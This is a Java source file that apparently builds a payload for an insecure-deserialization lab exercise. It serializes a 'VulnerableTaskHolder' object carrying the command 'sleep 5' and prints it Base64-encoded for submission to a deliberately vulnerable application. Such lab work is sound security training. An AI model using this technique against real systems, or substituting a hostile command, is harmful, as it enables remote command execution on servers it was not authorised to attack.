package org.dummy.insecure.framework;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;
public class Main {

    public static String toString(Serializable go ) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream( baos );
        oos.writeObject(go);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }


    public static void main(String[] args)
         throws IOException {
            VulnerableTaskHolder go = new VulnerableTaskHolder("sleep", "sleep 5");
            System.out.println(go.toString());
            String encoded = toString(go);
            System.out.println(encoded);


//        try{
//            VulnerableTaskHolder go = new VulnerableTaskHolder("dummy", "sleep 5");
//            ByteArrayOutputStream bos = new ByteArrayOutputStream();
//            ObjectOutputStream oos = new ObjectOutputStream(bos);
//            oos.writeObject(go);
//            oos.close();
//
//            String exp = Base64.getEncoder().encodeToString(bos.toByteArray());
//            System.out.println(exp);
//        }
//        catch (Exception e) {


    }
}